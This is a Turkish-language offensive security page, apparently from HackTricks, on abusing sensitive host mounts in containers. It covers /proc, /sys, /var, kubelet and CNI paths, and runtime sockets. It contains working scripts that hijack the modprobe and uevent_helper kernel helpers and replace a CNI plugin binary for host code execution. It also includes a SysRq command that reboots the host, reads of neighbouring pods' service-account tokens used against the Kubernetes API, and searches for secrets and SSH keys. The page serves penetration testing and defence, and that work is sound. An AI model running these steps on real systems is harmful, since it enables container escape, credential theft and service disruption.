# Hassas Host Mount'ları

{{#include ../../../banners/hacktricks-training.md}}

## Genel Bakış

Host mount'ları, dikkatle yalıtılmış bir süreç görünümünü doğrudan host kaynaklarına görünürlüğe geri döndürdükleri için container escape açısından en önemli pratik saldırı yüzeylerinden biridir. Tehlikeli durumlar yalnızca `/` ile sınırlı değildir. `/proc`, `/sys`, `/var`, runtime socket'leri, kubelet tarafından yönetilen durum dizinleri veya aygıtlarla ilişkili yolların bind mount edilmesi; kernel denetimlerini, kimlik bilgilerini, komşu container dosya sistemlerini ve runtime yönetim arayüzlerini açığa çıkarabilir.

Bu sayfa, kötüye kullanım modeli farklı koruma sayfalarını kesen bir konu olduğu için onlardan ayrı olarak hazırlanmıştır. Yazılabilir bir host mount'u; kısmen mount namespace'leri, kısmen user namespace'leri, kısmen AppArmor veya SELinux kapsamı, kısmen de hangi host yolunun açığa çıkarıldığı nedeniyle tehlikelidir. Konuyu ayrı ele almak, saldırı yüzeyini anlamayı çok daha kolaylaştırır.

Ayrıca host üzerinde yazılabilir bir dizini, her container içindeki karşılık gelen yol ile karşılaştırın. Dizin, çalıştırılabilir başlangıç script'lerinin üzerine mount edilmişse daha düşük yetkili bir host kullanıcısı, daha yüksek yetkili bir container entrypoint'inin bir sonraki yeniden başlatmada yükleyeceği kodu bırakabilir. Bind mount'un tam kaynak ve hedef yollarını, dizinin yazma/arama izinlerini, entrypoint döngüsünü ve çalıştırılabilir dosya gereksinimini, runtime UID'sini ve gerçek bir yeniden başlatma tetikleyicisini doğrulayın. Container UID 0, otomatik olarak host UID 0 anlamına gelmez; host üzerindeki etki user namespace eşlemesine ve mount politikasına bağlıdır. Pasif inceleme, script yazmadan veya workload'u yeniden başlatmadan yolları ve izinleri raporlamalıdır.

Bir Linux container, ayrı bir Windows host dosya sisteminin bir bölümünü paylaşan bir yönetim VM'sinin içinde bulunabilir. [VirtualBox shared folders](https://docs.oracle.com/en/virtualization/virtualbox/7.1/user/guestadditions.html), host dosyalarının guest içinde görünür hâle gelmesinin bir yoludur; ancak bu VM'deki root, Windows yöneticisinden farklı bir kimliktir. Paylaşım, okunabilir bir kullanıcının SSH private key'ini açığa çıkarıyorsa bunu bir kimlik bilgisi ipucu olarak değerlendirin: host destekli mount'u, anahtarın sahipliğini ve erişimini, eşleşen hesabı ve Windows SSH server'ın **etkin** authorized-key politikasını doğrulamadan host'a girişe izin verdiği sonucuna varmayın. Modern [Windows OpenSSH](https://learn.microsoft.com/en-us/windows-server/administration/openssh/openssh_keymanagement), yönetici hesapları için genellikle ayrı bir `administrators_authorized_keys` dosyası kullanır. Rutin envanter çıktısına private key içeriklerini eklemeyin; pasif ilk değerlendirme için mount ve anahtar yolu meta verileri yeterlidir.

## `/proc` Açığa Çıkması

procfs, hem sıradan süreç bilgilerini hem de yüksek etkili kernel denetim arayüzlerini içerir. Bu nedenle `-v /proc:/host/proc` gibi bir bind mount veya beklenmedik yazılabilir proc girdilerini açığa çıkaran bir container görünümü; bilgi ifşasına, hizmet engellemeye ya da doğrudan host üzerinde kod çalıştırmaya yol açabilir.

procfs içindeki yüksek değerli yollar şunlardır:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc/` (özellikle `register` ve `status`)
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Kötüye Kullanım

Önce yüksek değerli procfs girdilerinden hangilerinin görünür veya yazılabilir olduğunu kontrol edin:

```bash
for p in \
  /proc/sys/kernel/core_pattern \
  /proc/sys/kernel/modprobe \
  /proc/sys/fs/binfmt_misc/status \
  /proc/sys/fs/binfmt_misc/register \
  /proc/sysrq-trigger \
  /proc/kmsg \
  /proc/kallsyms \
  /proc/kcore \
  /proc/sched_debug \
  /proc/1/mountinfo \
  /proc/config.gz; do
  [ -e "$p" ] && ls -l "$p"
done
```

Bu yollar farklı nedenlerle dikkat çekicidir. `core_pattern`, `modprobe` ve `binfmt_misc`, yazılabilir olduklarında host üzerinde code-execution yollarına dönüşebilir. `kallsyms`, `kmsg`, `kcore` ve `config.gz`, kernel exploitation için güçlü keşif kaynaklarıdır. `sched_debug` ve `mountinfo`, container içinden host düzenini yeniden oluşturmaya yardımcı olabilecek process, cgroup ve filesystem bağlamını açığa çıkarır.

Her yolun pratik değeri farklıdır. Hepsini aynı etkiye sahipmiş gibi değerlendirmek triage işlemini zorlaştırır:

- `/proc/sys/kernel/core_pattern`
  Yazılabilir olması hâlinde bu, en yüksek etkili procfs yollarından biridir; çünkü kernel, bir crash sonrasında pipe handler çalıştırır. `core_pattern` değerini overlay'inde veya mount edilmiş bir host yolunda bulunan payload'ı gösterecek şekilde ayarlayabilen bir container, çoğu zaman host üzerinde code execution elde edebilir. Ayrıntılı bir örnek için [read-only-paths.md](protections/read-only-paths.md) dosyasına da bakın.
- `/proc/sys/kernel/modprobe`
  Bu yol, kernel'in module-loading logic'i çağırması gerektiğinde kullandığı userspace helper'ı denetler. Container içinden yazılabilir ve host bağlamında yorumlanabilir durumdaysa başka bir host code-execution primitive'ine dönüşebilir. Özellikle helper yolunu tetiklemenin bir yöntemiyle birlikte kullanıldığında dikkat çekicidir.
- `/proc/sys/vm/panic_on_oom`
  Bu genellikle doğrudan bir escape primitive'i değildir; ancak OOM koşullarını kernel panic davranışına dönüştürerek host genelinde denial of service'e yol açabilir.
- `/proc/sys/fs/binfmt_misc`
  Registration interface'i yazılabilir durumdaysa attacker, seçtiği bir magic value için handler kaydedebilir ve eşleşen bir dosya çalıştırıldığında host bağlamında execution elde edebilir.
- `/proc/config.gz`
  Kernel exploit triage için kullanışlıdır. Host package metadata'sına ihtiyaç duymadan hangi subsystem'lerin, mitigation'ların ve isteğe bağlı kernel özelliklerinin etkin olduğunu belirlemeye yardımcı olur.
- `/proc/sysrq-trigger`
  Çoğunlukla bir denial-of-service yolu olsa da çok ciddi sonuçlara yol açabilir. Host'u hemen yeniden başlatabilir, panic'e sokabilir veya başka şekilde aksatabilir.
- `/proc/kmsg`
  Kernel ring buffer mesajlarını açığa çıkarır. Host fingerprinting ve crash analysis için, ayrıca bazı ortamlarda kernel exploitation'a yardımcı olacak bilgileri leak etmek için kullanışlıdır.
- `/proc/kallsyms`
  Okunabilir olduğunda değerlidir; çünkü exported kernel symbol bilgilerini açığa çıkarır ve kernel exploit geliştirme sırasında address randomization varsayımlarını aşmaya yardımcı olabilir.
- `/proc/[pid]/mem`
  Bu, process belleğine doğrudan erişim sağlayan bir interface'tir. Hedef process'e gerekli ptrace tarzı koşullar altında erişilebiliyorsa başka bir process'in belleğini okumaya veya değiştirmeye imkân verebilir. Gerçekçi etkisi credentials, `hidepid`, Yama ve ptrace kısıtlamalarına büyük ölçüde bağlıdır; bu nedenle güçlü ama koşullu bir yoldur.
- `/proc/kcore`
  System memory'nin core-image tarzı bir görünümünü açığa çıkarır. Dosya çok büyük ve kullanımı zahmetlidir; ancak anlamlı şekilde okunabiliyorsa host memory yüzeyinin ciddi biçimde açığa çıktığını gösterir.
- `/dev/kmem` ve `/dev/mem`
  Bunlar tarihsel olarak yüksek etkili raw-memory **device** interface'leridir; procfs dosyaları değildir. Birçok modern sistemde bulunmazlar veya ciddi biçimde kısıtlanmışlardır; ancak host'tan mount edilmiş bir kopyayı açabilen bir container, bu açığa çıkmayı kritik olarak değerlendirmelidir. Var olmayan `/proc/kmem` veya `/proc/mem` yollarını aramak yerine bunları diğer hassas `/dev` mount'larıyla birlikte inceleyin.
- `/proc/sched_debug`
  Scheduling ve task bilgilerini leak ederek, diğer process görünümleri beklenenden daha temiz görünse bile host process kimliklerini açığa çıkarabilir.
- `/proc/[pid]/mountinfo`
  Container'ın host üzerinde gerçekte nerede bulunduğunu, hangi yolların overlay-backed olduğunu ve yazılabilir bir mount'un host içeriğine mi yoksa yalnızca container katmanına mı karşılık geldiğini yeniden oluşturmak için son derece kullanışlıdır.

`/proc/[pid]/mountinfo` veya overlay ayrıntıları okunabiliyorsa container filesystem'inin host üzerindeki yolunu belirlemek için bunları kullanın:

```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```

Bu komutlar kullanışlıdır; çünkü host üzerinde kod çalıştırmaya yönelik çeşitli numaralar, container içindeki bir path'in host açısından karşılık gelen path'e dönüştürülmesini gerektirir.

### Örnek: Bir `modprobe` Helper Path'i Hazırlama

`/proc/sys/kernel/modprobe` container içinden yazılabilir durumdaysa ve helper path host bağlamında yorumlanıyorsa, saldırganın kontrolündeki bir payload'a yönlendirilebilir. Overlay upper directory'nin host açısından çözümlenmesi gerekir. Container ayrıca host `/tmp` dizinini mount etmiyorsa, kanıt çıktısı host tarafından görülebilen aynı container katmanına yazılmalıdır:

```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_modprobe=$(cat /proc/sys/kernel/modprobe)
cat > /tmp/modprobe-payload <<EOF
#!/bin/sh
id > "$host_path/tmp/modprobe.out"
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
# Run only an authorized, lab-specific helper trigger here.
cat /tmp/modprobe.out
printf '%s\n' "$original_modprobe" > /proc/sys/kernel/modprobe
```

Tetikleyici tam olarak hedefe ve kernel davranışına bağlıdır ve bilerek tahmin edilmemiştir. Lab'den çıkmadan önce orijinal değeri geri yükleyin. Önemli nokta, yazılabilir bir helper path'in gelecekteki bir kernel helper invocation'ını saldırganın kontrolündeki host path içeriğine yönlendirebilmesidir. Eksik bir overlay `upperdir`, host'un çözemediği bir path, salt okunur bir sysctl mount'u veya seçilen helper'ı hiç çağırmayan bir kernel bu zinciri bozar.

### Tam Örnek: `kallsyms`, `kmsg` Ve `config.gz` İle Kernel Keşfi

Amaç hemen escape etmek yerine exploit edilebilirliği değerlendirmekse:

```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```

Bu komutlar, yararlı sembol bilgilerinin görünür olup olmadığını, son kernel iletilerinin ilginç bir durumu açığa çıkarıp çıkarmadığını ve hangi kernel özelliklerinin veya azaltımlarının derlenip etkinleştirildiğini anlamaya yardımcı olur. Etki genellikle doğrudan escape değildir; ancak kernel güvenlik açığı triyajını önemli ölçüde hızlandırabilir.

### Tam Örnek: SysRq Host Yeniden Başlatma

`/proc/sysrq-trigger` yazılabilir durumdaysa ve host görünümüne ulaşıyorsa:

```bash
echo b > /proc/sysrq-trigger
```

Etki, host'un anında yeniden başlatılmasıdır. Bu incelikli bir örnek değildir ancak procfs'in açığa çıkmasının bilgi ifşasından çok daha ciddi sonuçlara yol açabileceğini açıkça gösterir.

## `/sys` Exposure

sysfs, büyük miktarda kernel ve cihaz durumunu açığa çıkarır. Bazı sysfs yolları çoğunlukla fingerprinting için kullanışlıyken diğerleri helper çalıştırmayı, cihaz davranışını, güvenlik modülü yapılandırmasını veya firmware durumunu etkileyebilir.

Önemli sysfs yolları şunlardır:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Bu yollar farklı nedenlerle önemlidir. `/sys/class/thermal`, termal yönetim davranışını ve dolayısıyla kötü şekilde açığa çıkarılmış ortamlarda host kararlılığını etkileyebilir. `/sys/kernel/vmcoreinfo`, düşük seviyeli host fingerprinting'e yardımcı olan crash-dump ve kernel yerleşimi bilgilerini leak edebilir. `/sys/kernel/security`, Linux Security Modules tarafından kullanılan `securityfs` arayüzüdür; bu nedenle buradaki beklenmedik erişim, MAC ile ilgili durumu açığa çıkarabilir veya değiştirebilir. EFI değişken yolları, firmware destekli önyükleme ayarlarını etkileyebilir; bu da onları sıradan yapılandırma dosyalarından çok daha ciddi hale getirir. `/sys/kernel/debug` altındaki `debugfs` özellikle tehlikelidir; çünkü geliştiricilere yönelik bir arayüzdür ve güvenlik açısından, üretimde kullanılan sağlamlaştırılmış kernel API'lerine kıyasla çok daha az beklentiyle tasarlanmıştır.

Bu listedeki her sysfs girdisi **kernel'e, yapılandırmaya ve donanıma bağlıdır**. Güncel sanallaştırılmış düğümlerde genellikle `uevent_helper`, EFI değişkenleri ve termal cihaz girdileri hiç bulunmaz. Başka bir kernel'den alınmış bir örneğin geçerli olduğunu varsaymak yerine, bulunmayan yolları negatif önkoşul olarak kaydedin.

Bu yolları incelemek için kullanılabilecek komutlar şunlardır:

```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```

Bu komutları ilginç kılan şeyler:

- `/sys/kernel/security`, AppArmor, SELinux veya başka bir LSM yüzeyinin yalnızca host üzerinde görünür kalması gerekirken görünür olup olmadığını ortaya çıkarabilir.
- `/sys/kernel/debug`, bu gruptaki en endişe verici bulgudur. `debugfs` mount edilmiş ve okunabilir veya yazılabilir durumdaysa, kesin riski etkin debug düğümlerine bağlı olan geniş bir kernel yüzeyiyle karşılaşmayı bekleyin.
- EFI değişkenlerinin açığa çıkması daha az yaygındır; ancak mevcutsa yüksek etkilidir, çünkü sıradan çalışma zamanı dosyaları yerine firmware destekli ayarları etkiler.
- `/sys/class/thermal` daha çok host kararlılığı ve donanımla etkileşim açısından önemlidir; shell tarzı bir kaçış için pek uygun değildir.
- `/sys/kernel/vmcoreinfo` temel olarak host parmak izi çıkarma ve çökme analizi için bir kaynaktır; düşük seviyeli kernel durumunu anlamaya yardımcı olur.

### Tam Örnek: `uevent_helper`

`/sys/kernel/uevent_helper` kernel sürümüne ve yapılandırmasına bağlıdır ve güncel sistemlerin çoğunda bulunmaz. Mevcutsa, yazılabilir durumdaysa ve kullanılabilir bir `uevent` tetikleyicisi varsa, kernel saldırganın kontrolündeki bir yardımcı programı çalıştırabilir. Kanıt çıktısı hem host hem de container görünümünden erişilebilen bir yol kullanmalıdır:

```bash
[ -w /sys/kernel/uevent_helper ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_helper=$(cat /sys/kernel/uevent_helper)
cat > /evil-helper <<EOF
#!/bin/sh
id > "$host_path/output"
EOF
chmod +x /evil-helper
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
# This virtual-device path is a common lab trigger, but is not present everywhere.
uevent_file=/sys/class/mem/null/uevent
if [ ! -w "$uevent_file" ]; then
  printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
  echo "No writable, pre-approved uevent trigger was found" >&2
  exit 1
fi
echo change > "$uevent_file"
cat /output
printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
```

Bunun çalışmasının nedeni, helper path'in host'un bakış açısından yorumlanmasıdır. Tetiklendiğinde helper, mevcut container'ın içinde değil, host bağlamında çalışır. `/sys/class/mem/null/uevent`, bunu sunan kernel'lerde somut bir tetikleyicidir; diğer cihazlar kendi `uevent` dosyalarını sunabilir, ancak gerçek donanımda rastgele birini seçmeyin. Lab'den ayrılmadan önce özgün değeri geri yükleyin. Helper dosyası veya denetimli bir tetikleyici yoksa bu tekniğin kullanılabilir olduğunu bildirmeyin.

## `/var` Dizinine Erişim

Host'un `/var` dizinini bir container'a mount etmek, `/` dizinini mount etmek kadar çarpıcı görünmediğinden genellikle hafife alınır. Pratikte bu, runtime socket'lerine, container snapshot dizinlerine, kubelet tarafından yönetilen pod volume'larına, yansıtılmış service-account token'larına ve komşu uygulama dosya sistemlerine erişmek için yeterli olabilir. Modern node'larda operasyonel açıdan en ilgi çekici container durumunun çoğu genellikle `/var` içinde bulunur.

### Kubernetes Örneği

`hostPath: /var` kullanan bir pod, genellikle diğer pod'ların yansıtılmış token'larını ve overlay snapshot içeriğini okuyabilir:

```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```

Bu komutlar, mount'un yalnızca önemsiz uygulama verilerini mi yoksa kritik cluster kimlik bilgilerini mi açığa çıkardığını anlamak için kullanışlıdır. Okunabilir bir service-account token, yerel kod çalıştırmayı anında Kubernetes API erişimine dönüştürebilir.

Token mevcutsa, token'ı keşfetmekle yetinmek yerine neler erişebildiğini doğrulayın:

```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```

Buradaki etki, yerel node erişiminden çok daha büyük olabilir. Geniş RBAC yetkilerine sahip bir token, bağlanmış bir `/var` dizinini cluster genelinde bir ele geçirmeye dönüştürebilir.

### Docker Ve containerd Örneği

Docker host'larında ilgili veriler genellikle `/var/lib/docker` altında bulunurken, containerd kullanan Kubernetes node'larında `/var/lib/containerd` altında veya snapshotter'a özgü yollarda bulunabilir:

```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```

Bağlanan `/var`, başka bir workload'un yazılabilir snapshot içeriklerini açığa çıkarıyorsa saldırgan, mevcut container yapılandırmasına dokunmadan uygulama dosyalarını değiştirebilir, web içeriği yerleştirebilir veya başlangıç betiklerini değiştirebilir.

**Geçici bir lab workload'unda**, yazılabilir snapshot içeriği uygulama üzerinde değişiklik yapmayı, secret kurtarmayı veya lateral movement'ı göstermek için kullanılabilir. Önce runtime container ID'sini tam snapshot ile eşleştirin ve ilgisiz ya da production snapshot'larını asla düzenlemeyin:

```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f \( -path '*/.ssh/*' -o -path '*/authorized_keys' \) 2>/dev/null | head -n 20
```

Bu komutlar yararlıdır; çünkü bağlanmış `/var` dizininin üç temel etki kategorisini gösterir: uygulamalara müdahale, sırların elde edilmesi ve komşu iş yüklerine yanal hareket.

Doğrudan snapshot yazımları, runtime'ın normal durum yönetimini atlayarak container'ı bozabilir veya kanıtları yok edebilir. Salt okunur keşif, yerel olarak Docker `overlay2` üzerinde yeniden üretildi: komşu, geçici bir container'a yazılan işaretçi `/var/lib/docker/overlay2/<id>/diff/` altında göründü. Gerçek snapshot değişikliklerini, yalnızca bu test için oluşturulmuş geçici bir container ile sınırlı tutun.

## Kubelet Durumu, Eklentiler Ve CNI Yolları

`/var/lib/kubelet`, `/opt/cni/bin` veya `/etc/cni/net.d` bağlamaları genellikle ayrıcalıklı DaemonSet'ler, CNI agent'ları, CSI node eklentileri, GPU operatörleri ve depolama yardımcıları aracılığıyla açığa çıkar. Bu bağlamaları "node altyapısı" olarak görmek kolaydır; ancak bunlar yeni pod'lar için yürütme yolunun tam üzerinde bulunur ve genellikle kubelet kimlik bilgilerini, yansıtılmış sırları, kayıt soketlerini ve host tarafındaki çalıştırılabilir eklenti ikililerini içerir.

Değeri yüksek hedefler şunlardır:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

İnceleme için yararlı komutlar şunlardır:

```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
  egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```

Bu yollar neden önemlidir:

- `/var/lib/kubelet/pki`, kubelet istemci sertifikalarını ve düğüme özgü diğer kimlik bilgilerini açığa çıkarabilir. Küme tasarımına bağlı olarak bunlar bazen API server'a veya kubelet'e yönelik TLS uç noktalarına karşı yeniden kullanılabilir.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/pods`, aynı düğümdeki komşu pod'lar için projeksiyonlu service-account token'ları ve bağlanmış Secret'lar içerir.
- `/var/lib/kubelet/pod-resources/kubelet.sock` temel olarak bir keşif yüzeyidir, ancak oldukça kullanışlıdır: hangi pod ve container'ların şu anda GPU, hugepage, SR-IOV cihazları ve düğüme özgü diğer kıt kaynaklara sahip olduğunu gösterir.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins` ve `/var/lib/kubelet/plugins_registry`, hangi CSI, DRA ve device plugin'lerin kurulu olduğunu ve kubelet'in hangi socket'lerle iletişim kurmasının beklendiğini gösterir. Bu dizinler yalnızca okunabilir değil de yazılabilir durumdaysa, bulgu çok daha ciddi hâle gelir.<sup>[[1]](#references)</sup>
- `/opt/cni/bin` ve `/etc/cni/net.d`, doğrudan pod ağının kurulum yolunda yer alır. Buralara yazma erişimi, çoğu zaman yalnızca yapılandırmanın açığa çıkmasından ibaret olmayıp gecikmeli bir host execution primitive'idir.<sup>[[2]](#references)</sup>

### Tam Örnek: Yazılabilir `/opt/cni/bin`

Host CNI binary dizini read-write olarak bağlanmışsa, bir plugin'i değiştirmek kubelet'in o düğümde bir pod sandbox'ı bir sonraki oluşturduğunda host üzerinde kod yürütme elde etmek için yeterli olabilir:<sup>[[2]](#references)</sup>

```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
  grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > "$(dirname "$0")/.cni-triggered"
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
cat "$(dirname "$plugin")/.cni-triggered"
mv "${plugin}.orig" "$plugin"
rm -f "$(dirname "$plugin")/.cni-triggered"
```

Bu, mount edilmiş bir `docker.sock` kadar doğrudan değildir ancak Kubernetes altyapısındaki ele geçirilmiş pod'larda çoğu zaman daha gerçekçidir. İşaretçi, mount edilmiş plugin'in yanına yazılır; böylece container, host-root veya host-`/tmp` mount'u olmasa bile işaretçiyi alabilir. Wrapper, özgün argümanları ve standart girdiyi korur; ardından örnek, özgün binary'yi geri yükler. Önemli nokta, değiştirilmiş binary'nin mevcut container tarafından değil, daha sonra host ağ kurulum akışı tarafından çalıştırılmasıdır. Geçersiz bir wrapper yeni Pod sandbox'larının ağ bağlantısı almasını engelleyebileceğinden yalnızca gözden çıkarılabilir bir node kullanın.

## Çalışma Zamanı Socket'leri

Hassas host mount'ları çoğu zaman tam dizinler yerine çalışma zamanı socket'lerini içerir. Bunlar o kadar önemlidir ki burada açıkça tekrar ele alınmayı hak ederler:

```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```

Bu soketlerden biri mount edildiğinde izlenecek tam exploit akışları için [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) dosyasına bakın.

İlk etkileşim için hızlı bir örüntü olarak:

```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```

Bunlardan biri başarılı olursa, "mount edilmiş socket" üzerinden "daha ayrıcalıklı bir sibling container başlatma" yoluna ulaşmak, genellikle herhangi bir kernel breakout yolundan çok daha kısadır.

Aynı daemon erişimi **host üzerinde kalıcılık** da sağlayabilir. Yazılabilir bir host-root bind mount'a sahip helper container, `docker cp` aracılığıyla dosya alabilir; ardından `docker exec` kullanarak mount edilmiş host path'i altına bir SSH key'i, service unit'i veya başka bir kalıcılık dosyası yerleştirebilir. Güvenlik sınırı, daemon'ın host mount oluşturma yetkisidir; `docker cp` yalnızca dosyaları hazırlama adımıdır. Bir runtime socket açığa çıktıktan sonra hem yeni oluşturulan container'ları hem de host authentication veya startup path'lerine yapılan yazma işlemlerini denetleyin.

## Yazılabilir Host Path Üzerinden Task Hijack

Yazılabilir bir host mount'ın tehlikeli olması için `/` yolunu açığa çıkarması gerekmez. Mount edilmiş path; script'ler, config dosyaları, hook'lar, plugin'ler veya host tarafındaki zamanlanmış bir task ya da service tarafından daha sonra tüketilen dosyalar içeriyorsa container, host'un çalıştırdığı şeyi değiştirebilir.

Genel inceleme akışı:

```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```

Yazılabilir bir dosya host process tarafından kullanılıyorsa, test sırasında payload'ı basit ve gözlemlenebilir tutun:

```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```

İlginç olan güven sınırıdır: yazma işlemi container içinden yapılır, ancak yürütme daha sonra host hizmeti bağlamında gerçekleşir. Böylece dar kapsamlı bir hostPath veya bind mount, gecikmeli bir host-code-execution primitive'ine dönüşür.

## Paylaşılan Host Path Üzerindeki Root Sahibi Dosyalar

Root yetkisi alabilen bir container hesabı, host tarafından da kullanılan yazılabilir bir path'e root sahibi bir dosya yerleştirebilir. Container UID 0, host UID 0'a eşleniyorsa her iki görünüm de aynı dosyayı işaret eder ve host mount SUID yürütmeye izin veriyorsa, bu path'te root sahibi bir SUID executable çalıştırabilen bir host kullanıcısı host ayrıcalık sınırını aşabilir. Bu dosya sahipliği sorunu için container'ın `--privileged` ile çalışması gerekmez. Ayrı koşullar için [user namespace mappings](protections/namespaces/user-namespace.md) ve [SUID tartışmasına](privileged-containers.md) bakın.

Path'i **her iki taraftan** inceleyin: zararsız bir dosyanın sahipliğini ve kimliğini karşılaştırın, container'ın `uid_map` ve `gid_map` dosyalarını kontrol edin, host'un mount seçeneklerini ve yürütme politikasını inceleyin. `nosuid` olmadan container tarafında `rw` görülmesi yalnızca bir adaydır; host sahipliğini, host mount bayraklarını, host kullanıcısının erişimini veya AppArmor/SELinux'un yürütmeyi engelleyip engellemediğini kanıtlamaz. `noexec`, geçerli olduğu görünümde yürütmeyi kısıtlar. `/proc/self/mountinfo` içindeki `shared:` ve `master:` etiketleri mount propagation'ı açıklar; dosya içeriğinin host ile paylaşılıp paylaşılmadığını değil. Bir bind mount'ta bu etiketler bulunmayabilir. Host oturumu sağlayan kimlik bilgilerini yeniden kullanmak, paylaşılan dosyanın oluşturduğu ayrıcalık sınırından farklı bir adımdır.

Host'un runtime depolaması, açık bir bind mount olmasa da benzer bir path oluşturabilir. [CVE-2021-41091](https://github.com/moby/moby/security/advisories/GHSA-3fwx-pjgw-3558), ayrıcalıksız bir host kullanıcısının Docker veri alt dizinlerinde gezinmesine ve container filesystem'ındaki dosyaları çalıştırmasına olanak sağladı; Moby izinleri 20.10.9 sürümünde düzeltti ve dizinlerini düzeltmek için çalışan container'ların yeniden başlatılması gerektiğini belirtti. Tam olarak bağlanmış `overlay2/<id>/merged` path'lerini ve her üst dizinin arama iznini inceleyin; ardından container UID 0'ın host UID 0'a eşlenip eşlenmediğini, gerçek bir root sahibi SetUID executable'ın mevcut ve erişilebilir olup olmadığını ve host görünümünün SetUID yürütmeye izin verip vermediğini belirleyin. Rootless veya user-namespace-remapped container'lar, `nosuid`, `noexec`, `no_new_privs` ve MAC politikası sonucu değiştirebilir. Tek başına bir runtime sürümü veya erişilebilir path, host-root yürütmenin kanıtı değil, inceleme için bir ipucudur; aday bir executable'ı çalıştırmadan mount ve dosya metadata'sını inceleyin.

## Mount İle İlgili CVE'ler

Host mount'ları runtime güvenlik açıklarıyla da kesişir. Yakın tarihli önemli örnekler:

- `runc` içindeki `CVE-2024-21626`: sızdırılmış bir dizin file descriptor'ı, çalışma dizinini host filesystem'ı üzerinde konumlandırabilirdi.
- BuildKit içindeki `CVE-2024-23651`, `CVE-2024-23652` ve `CVE-2024-23653`: kötü amaçlı Dockerfile'lar, frontend'ler ve `RUN --mount` akışları, build sırasında host dosyalarına erişimi, bunların silinmesini veya ayrıcalıkların yükseltilmesini yeniden mümkün kılabilirdi.
- Buildah ve Podman build akışlarındaki `CVE-2024-1753`: build sırasında hazırlanmış bind mount'lar `/` dizinini read-write olarak açığa çıkarabilirdi.
